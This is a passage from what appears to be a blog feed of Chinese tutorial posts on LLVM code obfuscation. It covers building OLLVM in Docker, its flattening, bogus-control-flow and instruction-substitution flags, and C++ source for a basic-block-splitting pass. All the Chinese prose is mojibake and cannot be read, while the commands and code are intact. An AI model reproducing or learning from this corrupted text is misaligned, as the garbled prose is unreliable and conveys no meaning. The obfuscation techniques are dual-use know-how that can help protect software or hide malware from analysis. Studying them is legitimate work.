æ‰€æ‰§è¡Œçš„å…·ä½“è®¡ç®—ã€‚</p><p>ç»å…¸çš„è®¡ç®—æ··æ·†æœ‰ï¼šæŒ‡ä»¤æ›¿ä»£ã€å¸¸é‡æ›¿ä»£ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213235744.png" alt="image-20230213213235744"></p><h3 id="è™šæ‹Ÿæœºæ··æ·†"><a href="#è™šæ‹Ÿæœºæ··æ·†" class="headerlink" title="è™šæ‹Ÿæœºæ··æ·†"></a>è™šæ‹Ÿæœºæ··æ·†</h3><p>è™šæ‹Ÿæœºæ··æ·†çš„æ€æƒ³æ˜¯å°†ä¸€ç»„æŒ‡ä»¤é›†åˆï¼ˆå¦‚ä¸€ç»„ x86 æŒ‡ä»¤ï¼‰ï¼Œè½¬åŒ–ä¸ºä¸€ç»„æ”»å‡»è€…æœªçŸ¥çš„è‡ªå®šä¹‰æŒ‡ä»¤é›†ã€‚å¹¶ç”¨ä¸ç¨‹åºç»‘å®šçš„è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œã€‚</p><p>ç»å…¸è™šæ‹Ÿæœºæ··æ·†ï¼šVMProtect</p><p>è™šæ‹Ÿæœºæ··æ·†æ˜¯ç›®å‰æœ€å¼ºåŠ›çš„æ··æ·†ï¼Œä½†ä¹Ÿæœ‰è®¸å¤šç¼ºç‚¹ï¼šå¦‚æ€§èƒ½æŸè€—å¤§ã€å®¹æ˜“è¢«æ€æ¯’è½¯ä»¶æŠ¥æ¯’ç­‰ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213412543.png" alt="image-20230213213412543"></p><h1 id="OLLVM-ä½¿ç”¨"><a href="#OLLVM-ä½¿ç”¨" class="headerlink" title="OLLVM ä½¿ç”¨"></a>OLLVM ä½¿ç”¨</h1><p>Obfuscator-LLVMï¼ˆç®€ç§°OLLVMï¼‰æ˜¯2010å¹´6æœˆç”±ç‘å£«è¥¿éƒ¨åº”ç”¨ç§‘å­¦å¤§å­¦(HEIG-VD)çš„ä¿¡æ¯å®‰å…¨å°ç»„å‘ èµ·çš„ä¸€ä¸ªé¡¹ç›®ã€‚ è¿™ä¸ªé¡¹ç›®çš„ç›®çš„æ˜¯æä¾›ä¸€ä¸ª LLVM ç¼–è¯‘å¥—ä»¶çš„å¼€æºåˆ†æ”¯ï¼Œèƒ½å¤Ÿé€šè¿‡ä»£ç æ··æ·†å’Œé˜²ç¯¡æ”¹æ ä¾›æ›´é«˜çš„è½¯ä»¶å®‰å…¨æ€§ã€‚</p><p>OLLVM æä¾›äº†ä¸‰ç§ç»å…¸çš„ä»£ç æ··æ·†ï¼š</p><ul><li>æ§åˆ¶æµå¹³å¦åŒ– Control Flow Flattening</li><li>è™šå‡æ§åˆ¶æµ Bogus Control Flow</li><li>æŒ‡ä»¤æ›¿ä»£ Instruction Subsititution</li></ul><h2 id="Ubuntu-x2F-OLLVM-x2F-Docker-ç‰ˆæœ¬"><a href="#Ubuntu-x2F-OLLVM-x2F-Docker-ç‰ˆæœ¬" class="headerlink" title="Ubuntu&#x2F;OLLVM&#x2F;Docker ç‰ˆæœ¬"></a>Ubuntu&#x2F;OLLVM&#x2F;Docker ç‰ˆæœ¬</h2><ul><li>Ubuntu 16.04</li><li>OLLVM 4.0</li><li>Docker 20.10.7</li></ul><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>ç¬¬ä¸€æ­¥ï¼šå®‰è£… docker</p><p><a href="https://blog.csdn.net/qq_42376617/article/details/126389108">å‚è€ƒæ•™ç¨‹ ç‚¹å‡»ç›´è¾¾</a></p><p>ç¬¬äºŒæ­¥ï¼špull docker å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nickdiego/ollvm-build</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215124300406.png" alt="image-20230215124300406"></p><p>ç¬¬ä¸‰æ­¥ï¼šä¸‹è½½å®‰è£…è„šæœ¬å’Œ OLLVM æºä»£ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nickdiego/docker-ollvm.git</span><br><span class="line">git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215124323394.png" alt="image-20230215124323394"></p><p>ç¬¬å››æ­¥ï¼šåœ¨ docker å®¹å™¨ä¸Šç¼–è¯‘ OLLVM</p><p>åœ¨ <code>ollvm-build.sh</code> çš„ç¬¬ 150 è¡ŒåŠ å…¥ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_COM+=<span class="string">&quot; -DLLVM_INCLUDE_TESTS=OFF&quot;</span></span><br></pre></td></tr></table></figure><p>å…³é—­ llvm çš„å¤´æ–‡ä»¶æµ‹è¯•ï¼Œä¸ºäº†åŠ å¿«ç¼–è¯‘é€Ÿåº¦</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215124400504.png" alt="image-20230215124400504"></p><p>æ‰§è¡Œ<code>ollvm-build.sh</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ollvm-build.sh</span><br><span class="line">sudo ./ollvm-build.sh ../obfuscator</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215141045340.png" alt="image-20230215141045340"></p><p>ç¼–è¯‘äº†å¿«ä¿©å°æ—¶ï¼Œç¼–è¯‘å®Œæˆååœ¨<code>obfuscator/build_release</code>ç›®å½•æ‰§è¡ŒæŒ‡ä»¤åˆ›å»ºè½¯é“¾æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln ./bin/* /usr/bin/</span><br></pre></td></tr></table></figure><p>è¾“å…¥<code>clang --version</code>æŒ‡ä»¤ç¡®å®šå®‰è£…æ˜¯å¦å®Œæˆï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215141138975.png" alt="image-20230215141138975"></p><h2 id="æµ‹è¯•æ–‡ä»¶-ida-åˆ†æ"><a href="#æµ‹è¯•æ–‡ä»¶-ida-åˆ†æ" class="headerlink" title="æµ‹è¯•æ–‡ä»¶ ida åˆ†æ"></a>æµ‹è¯•æ–‡ä»¶ ida åˆ†æ</h2><p>æ¸…æ™°æ˜äº†ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151112343.png" alt="image-20230215151112343"></p><p>æµç¨‹ç®€å•ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151136939.png" alt="image-20230215151136939"></p><h2 id="æ§åˆ¶æµå¹³å¦åŒ–-Control-Flow-Flattening"><a href="#æ§åˆ¶æµå¹³å¦åŒ–-Control-Flow-Flattening" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ– Control Flow Flattening"></a>æ§åˆ¶æµå¹³å¦åŒ– Control Flow Flattening</h2><p>å¯ç”¨é€‰é¡¹ï¼š</p><ul><li><code>-mllvm -fla</code>ï¼šæ¿€æ´»æ§åˆ¶æµå¹³å¦åŒ–</li><li><code>-mllvm -split</code>ï¼šæ¿€æ´»åŸºæœ¬å—åˆ†å‰²</li><li><code>-mllvm -split_num=3</code>ï¼šæŒ‡å®šåŸºæœ¬å—åˆ†å‰²çš„æ•°ç›®ï¼Œè¿™é‡ŒæŒ‡å®šä¸€ä¸ªåŸºæœ¬å—ä¼šè¢«åˆ†å‰²æˆä¸‰ä¸ªåŸºæœ¬å—åå†è¿›è¡Œæ§åˆ¶æµå¹³å¦åŒ–æ··æ·†</li></ul><p>ä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -fla -mllvm -split -mllvm -split_num=3 TestProgram.cpp -o TestProgram_fla</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘æ—¶å¯èƒ½å‡ºç°<code>stddef.h</code>å’Œ<code>stdarg.h</code>ä¸¤ä¸ªå¤´æ–‡ä»¶ä¸å­˜åœ¨çš„é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨<code>locate stddef.h</code>å’Œ<code>locate stdarg.h</code>æŒ‡ä»¤æ‰¾åˆ°è¿™ä¸¤ä¸ªå¤´æ–‡ä»¶çš„ä½ç½®ï¼Œç„¶åå¤åˆ¶åˆ°<code>/usr/include</code>æˆ–<code>usr/local/include</code>ç›®å½•ä¸‹</p><blockquote><p>ä½¿ç”¨<code> locate</code> å‘½ä»¤å¯ä»¥çœ‹åˆ°å¾ˆå¤šç›®å½•ä¸‹éƒ½æœ‰<code>stddef.h</code>å’Œ<code>stdarg.h</code>è¿™ä¸¤ä¸ªå¤´æ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå¤´æ–‡ä»¶åªèƒ½æ˜¯å¤åˆ¶<code>/usr/lib/gcc/x86_64-linux-gnu/5/include</code>è¿™ä¸ªç›®å½•ä¸‹çš„ï¼Œå…¶ä»–ç›®å½•ä¸‹çš„å¤åˆ¶è¿‡å»ç¼–è¯‘ä¼šæŠ¥é”™</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215150703288.png" alt="image-20230215150703288"></p><p>ç¼–è¯‘å¾—åˆ°æ–‡ä»¶ï¼Œæ‹–å» ida çœ‹ï¼Œç†Ÿæ‚‰çš„ä¸€å¨</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215150919567.png" alt="image-20230215150919567"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151344546.png" alt="image-20230215151344546"></p><h2 id="è™šå‡æ§åˆ¶æµ-Bogus-Control-Flow"><a href="#è™šå‡æ§åˆ¶æµ-Bogus-Control-Flow" class="headerlink" title="è™šå‡æ§åˆ¶æµ Bogus Control Flow"></a>è™šå‡æ§åˆ¶æµ Bogus Control Flow</h2><p>å¯ç”¨é€‰é¡¹ï¼š</p><ul><li><code>-mllvm -bcf</code>ï¼šæ¿€æ´»è™šå‡æ§åˆ¶æµ</li><li><code>-mllvm -bcf_loop=3</code>ï¼šæ··æ·†æ¬¡æ•°ï¼Œè¿™é‡ŒæŒ‡å®šä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·†ä¸‰æ¬¡ï¼Œé»˜è®¤ä¸€æ¬¡</li><li><code>-mllvm -bcf_prob=40</code>ï¼šæ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ï¼Œè¿™é‡Œæ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ä¸º40%ï¼Œé»˜è®¤ä¸º30%</li></ul><p>ä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 TestProgram.cpp -o TestProgram_bcf</span><br></pre></td></tr></table></figure><p>å·¨é•¿ä¸€æ¡ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151513361.png" alt="image-20230215151513361"></p><p>ç†Ÿæ‚‰çš„è¡¨è¾¾å¼ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151554912.png" alt="image-20230215151554912"></p><h2 id="æŒ‡ä»¤æ›¿ä»£-Instruction-Subsititution"><a href="#æŒ‡ä»¤æ›¿ä»£-Instruction-Subsititution" class="headerlink" title="æŒ‡ä»¤æ›¿ä»£ Instruction Subsititution"></a>æŒ‡ä»¤æ›¿ä»£ Instruction Subsititution</h2><p>å¯ç”¨é€‰é¡¹ï¼š</p><ul><li><code>-mllvm-sub</code>ï¼šæ¿€æ´»æŒ‡ä»¤æ›¿ä»£</li><li><code>-mllvm -sub_loop=3</code>ï¼šæ··æ·†æ¬¡æ•°ï¼Œè¿™é‡ŒæŒ‡å®šä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·†ä¸‰æ¬¡ï¼Œé»˜è®¤ä¸€æ¬¡</li></ul><p>ä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -sub -mllvm -sub_loop=3 TestProgram.cpp -o TestProgram_sub</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151730797.png" alt="image-20230215151730797"></p><p>åœ¨è®¡ç®—è¡¨è¾¾å¼å¤šçš„å‡½æ•°ï¼Œå¦‚åŠ å¯†å‡½æ•°é‡Œï¼Œæ··æ·†çš„æ•ˆæœæ¯”è¾ƒå¥½ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151755654.png" alt="image-20230215151755654"></p>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆä¸‰ï¼‰</title>
      <link href="/posts/20199/"/>
      <url>/posts/20199/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="åŸºæœ¬å—åˆ†å‰²"><a href="#åŸºæœ¬å—åˆ†å‰²" class="headerlink" title="åŸºæœ¬å—åˆ†å‰²"></a>åŸºæœ¬å—åˆ†å‰²</h1><p>åŸºæœ¬å—åˆ†å‰²å³å°†ä¸€ä¸ªåŸºæœ¬å—åˆ†å‰²ä¸ºç­‰ä»·çš„è‹¥å¹²ä¸ªåŸºæœ¬å—ï¼Œåœ¨åˆ†å‰²åçš„åŸºæœ¬å—ä¹‹é—´åŠ ä¸Šæ— æ¡ä»¶è·³è½¬ã€‚</p><p>åŸºæœ¬å—åˆ†å‰²ä¸èƒ½ç®—æ˜¯æ··æ·†ï¼Œä½†æ˜¯å¯ä»¥æé«˜æŸäº›ä»£ç æ··æ·†çš„æ··æ·†æ•ˆæœã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208005757996.png" alt="image-20230208005757996"></p><h2 id="ä¸ºä»€ä¹ˆè¦åˆ†å‰²"><a href="#ä¸ºä»€ä¹ˆè¦åˆ†å‰²" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åˆ†å‰²"></a>ä¸ºä»€ä¹ˆè¦åˆ†å‰²</h2><p>åœ¨è®¸å¤šåŸºäºåŸºæœ¬å—çš„ä»£ç æ··æ·†ä¸­ï¼ŒåŸºæœ¬å—æ•°é‡è¶Šå¤šï¼Œä»£ç æ··æ·†åçš„å¤æ‚åº¦è¶Šå¤§ã€‚</p><p>é€šè¿‡å¢åŠ åŸºæœ¬å—çš„æ•°é‡ï¼Œå¯ä»¥åˆ°è¾¾æé«˜æ··æ·†æ•ˆæœçš„ç›®çš„ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208005944236.png" alt="image-20230208005944236"></p><h2 id="å®ç°æ€è·¯"><a href="#å®ç°æ€è·¯" class="headerlink" title="å®ç°æ€è·¯"></a>å®ç°æ€è·¯</h2><p>éå†æ¯ä¸ªå‡½æ•°ä¸­çš„æ¯ä¸ªåŸºæœ¬å—ï¼Œå¯¹æ¯ä¸ªåŸºæœ¬å—è¿›è¡Œåˆ†å‰²å³å¯ã€‚</p><blockquote><p>æœ‰ PHI æŒ‡ä»¤çš„åŸºæœ¬å—é€‰æ‹©è·³è¿‡</p><p>å› ä¸º PHI å€¼æ ¹æ®å‰é©±å—æŒ‡å®šï¼Œåˆ†å‰²å¸¦æœ‰ PHI æŒ‡ä»¤çš„åŸºæœ¬å—å¯èƒ½ä¼šæ”¹å˜å…¶å‰é©±å—ï¼Œå¯¼è‡´å¸¦æœ‰ PHI æŒ‡ä»¤çš„åŸºæœ¬å—çš„å‰é©±å—æ˜¯åˆ†å‰²å‰çš„åŒä¸€ä¸ªåŸºæœ¬å—</p></blockquote><h2 id="ä½¿ç”¨åˆ°çš„-API"><a href="#ä½¿ç”¨åˆ°çš„-API" class="headerlink" title="ä½¿ç”¨åˆ°çš„ API"></a>ä½¿ç”¨åˆ°çš„ API</h2><ul><li>é¢å¤–å‚æ•°æŒ‡å®š</li></ul><p>å¯ä»¥é€šè¿‡ <strong>cl::opt</strong> æ¨¡æ¿ç±»è·å–æŒ‡ä»¤ä¸­çš„å‚æ•°ï¼Œè¿™é‡Œçš„ opt æ˜¯é€‰é¡¹ option çš„ç¼©å†™ï¼Œä¸æ˜¯ä¼˜åŒ–å™¨çš„æ„æ€ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯é€‰çš„å‚æ•°ï¼ŒæŒ‡å®šä¸€ä¸ªåŸºæœ¬å—ä¼šè¢«åˆ†è£‚æˆå‡ ä¸ªåŸºæœ¬å—ï¼Œé»˜è®¤å€¼ä¸º 2</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">splitNum</span><span class="params">(<span class="string">&quot;split_num&quot;</span>, cl::init(<span class="number">2</span>), cl::desc(<span class="string">&quot;Split &lt;split_num&gt; time(s) each BB&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘½ä»¤ï¼š</span></span><br><span class="line">opt -load ../Build/LLVMObfuscator.so -split -split_num <span class="number">5</span> -S TestProgram.ll -o TestProgram_split.ll</span><br></pre></td></tr></table></figure><ul><li>splitBasicBlock å‡½æ•°</li></ul><p>splitBasicBlock å‡½æ•°æ˜¯ BasicBlock ç±»çš„ä¸€ä¸ªæˆå‘˜å‡½æ•°ã€‚åœ¨BasicBlock.h å¤´æ–‡ä»¶é‡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„ä¸¤ç§ç”¨æ³•ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208143330733.png" alt="image-20230208143330733"></p><p>å°†ä¸€ä¸ªåŸºæœ¬å—ï¼Œåœ¨æŒ‡ä»¤ I å¤„ä¸€åˆ†ä¸ºäºŒï¼ŒæŒ‡ä»¤ I ä¹‹å‰çš„æŒ‡ä»¤ä¼šè¢«æ”¾åœ¨ç¬¬ä¸€ä¸ªåŸºæœ¬å—é‡Œï¼ŒåŒ…æ‹¬æŒ‡ä»¤ I çš„åé¢æŒ‡ä»¤ æ”¾åˆ°ç¬¬äºŒä¸ªåŸºæœ¬å—é‡Œï¼Œæœ€ååœ¨ç¬¬ä¸€ä¸ªåŸºæœ¬å—é‡Œå»ºç«‹ç»å¯¹è·³è½¬</p><p>æœ‰ä¸¤ç§ç”¨æ³•ï¼ŒåŒºåˆ«åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ç§ç”¨è¿­ä»£å™¨ï¼Œç¬¬äºŒç§ç”¨æŒ‡é’ˆã€‚</p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šåˆ†è£‚å‡ºæ¥çš„æ–°åŸºæœ¬å—åç§°ã€‚</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ç”¨äºæ”¹å˜ä¸¤ä¸ªåŸºæœ¬å—çš„é¡ºåºï¼Œä¸º<code>true</code>æ—¶ï¼Œç¬¬äºŒä¸ªåŸºæœ¬å—ä¼šæ”¾åˆ°ç¬¬ä¸€ä¸ªåŸºæœ¬å—ä¹‹å‰</p><p>è¿”å›ç»“æœæ˜¯æŒ‡å‘ç¬¬äºŒä¸ªåŸºæœ¬å—ï¼ˆæ–°ï¼‰çš„æŒ‡é’ˆ</p><p>ä»£ç ç‰‡æ®µåˆ†æï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SplitBasicBlock::split</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    BasicBlock *curBB = BB;</span><br><span class="line">    <span class="comment">// è®¡ç®—åˆ†è£‚åæ¯ä¸ªåŸºæœ¬å—çš„å¤§å°</span></span><br><span class="line">    <span class="type">int</span> splitSize = BB-&gt;<span class="built_in">size</span>() / splitNum;</span><br><span class="line">    <span class="keyword">if</span>(splitSize)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; splitNum;i ++)&#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(Instruction &amp;I : *curBB)&#123;</span><br><span class="line">                <span class="keyword">if</span>(++cnt == splitSize)&#123;</span><br><span class="line">                    <span class="comment">// åœ¨ I æŒ‡ä»¤å¤„å¯¹åŸºæœ¬å—è¿›è¡Œåˆ†å‰²</span></span><br><span class="line">                    curBB = curBB-&gt;<span class="built_in">splitBasicBlock</span>(&amp;I);<span class="comment">// ä¼ é€’æŒ‡ä»¤ I çš„æŒ‡é’ˆåœ°å€ï¼Œéå¼•ç”¨</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>isa &lt;&gt; å‡½æ•°</li></ul><p>isa&lt;&gt; æ˜¯ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ï¼Œç”¨äºåˆ¤æ–­ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®çš„ç±»å‹æ˜¯ä¸æ˜¯ç»™å®šçš„ç±»å‹ï¼Œç±»ä¼¼äº Java ä¸­çš„ instanceof</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­åŸºæœ¬å—ä¸­æ˜¯å¦å­˜åœ¨ PHI æŒ‡ä»¤</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::containsPHI</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><ul><li>Transforms<ul><li>include<ul><li>SplitBasicBlock.h</li></ul></li><li>src<ul><li>SplitBasicBlock.cpp</li></ul></li></ul></li></ul><h3 id="SplitBasicBlock-cpp"><a href="#SplitBasicBlock-cpp" class="headerlink" title="SplitBasicBlock.cpp"></a>SplitBasicBlock.cpp</h3><p>å¼•å…¥æŒ‡ä»¤å‚æ•°<code>splitNum</code>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯é€‰çš„å‚æ•°ï¼ŒæŒ‡å®šä¸€ä¸ªåŸºæœ¬å—ä¼šè¢«åˆ†è£‚æˆå‡ ä¸ªåŸºæœ¬å—ï¼Œé»˜è®¤å€¼ä¸º 2</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">splitNum</span><span class="params">(<span class="string">&quot;split_num&quot;</span>, cl::init(<span class="number">2</span>), cl::desc(<span class="string">&quot;Split&lt;split_num&gt; time(s) each BB&quot;</span>))</span></span>;</span><br></pre></td></tr></table></figure><p><code>SplitBasicBlock</code>ç±»å®šä¹‰ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SplitBasicBlock</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">SplitBasicBlock</span>() : <span class="built_in">FunctionPass</span>(ID)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å¯¹å•ä¸ªåŸºæœ¬å—æ‰§è¡Œåˆ†è£‚æ“ä½œ</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">split</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ¤æ–­ä¸€ä¸ªåŸºæœ¬å—ä¸­æ˜¯å¦åŒ…å« PHI æŒ‡ä»¤ï¼ˆPHINodeï¼‰</span></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">containsPHI</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>runOnFunction</code>å‡½æ•°å®ç°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ­¥ï¼šä¿å­˜åŸå…ˆçš„æ‰€æœ‰åŸºæœ¬å—</span></span><br><span class="line">    vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç¬¬äºŒæ­¥ï¼šå¯¹æ¯ä¸ªä¸åŒ…å« PHI æŒ‡ä»¤çš„åŸºæœ¬å—æ‰§è¡Œåˆ†è£‚æ“ä½œ</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">containsPHI</span>(BB))&#123;</span><br><span class="line">            <span class="built_in">split</span>(BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span 